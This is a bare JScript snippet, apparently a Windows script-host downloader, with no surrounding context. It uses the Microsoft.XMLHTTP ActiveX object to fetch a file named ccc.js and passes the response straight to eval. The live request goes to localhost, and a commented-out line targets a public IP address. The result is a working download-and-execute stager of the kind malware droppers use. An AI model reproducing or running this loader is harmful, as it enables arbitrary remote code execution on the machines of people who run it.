var xml=new ActiveXObject("Microsoft.XMLHTTP");
//xml.open("GET","http://121.40.101.79/ccc.js",false);
xml.open("GET","http://127.0.0.1/ccc.js",false);
xml.send();
var aaa=xml.responseText;
eval(aaa);
